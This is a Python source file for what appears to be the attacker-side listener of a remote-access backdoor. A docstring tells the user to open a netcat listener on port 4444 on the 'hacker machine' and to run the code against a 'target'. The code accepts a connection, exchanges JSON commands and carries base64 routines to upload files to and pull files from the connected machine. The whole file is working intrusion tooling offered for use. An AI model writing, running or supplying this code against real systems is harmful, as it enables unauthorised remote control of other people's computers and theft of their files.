#!/usr/bin/env python3
'''
Do this on hacker machine:

nc -vv -l -p 4444
netcat verbose listen port 4444


Run this code on the target:

'''
import argparse
import json
import socket
import subprocess
import base64

def get_my_ip():
    ip = subprocess.check_output("hostname -I", shell=True)
    ip = ip.decode("utf-8")
    return ip
class Listener:
    def __init__(self, port):
        # create a socket object
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # listener
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((get_my_ip().strip(), port))
        self.listener.listen()
        print("[INFO] Waiting for connections at port " + str(port))
        self.connection, address = self.listener.accept()
        print("[INFO] Connected to " + str(address[0]) + " at port " + str(address[1]))

    def send_str(self, stringMessage):
        self.connection.send(("\n" + stringMessage).encode("utf-8"))
        return

    def send_json(self, message):
        json_data = json.dumps(message)
        self.connection.send(json_data.encode("utf-8"))
        return

    def recv_json(self, bufferSize):
        recv_data_json=""
        while True:
            try:
                recv_data_json = recv_data_json  + self.connection.recv(bufferSize).decode("utf-8")
                return json.loads(recv_data_json)
            except ValueError:
                continue

    def recv_str(self, bufferSize):
        recv_data = self.connection.recv(bufferSize).decode("utf-8")
        return recv_data

    def close(self):
        self.listener.close()

    def write_file(self, content, filename):
        with open(filename, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def get_file(self, fname):
        with open(fname, "rb") as file:
            return base64.b64encode(file.read())







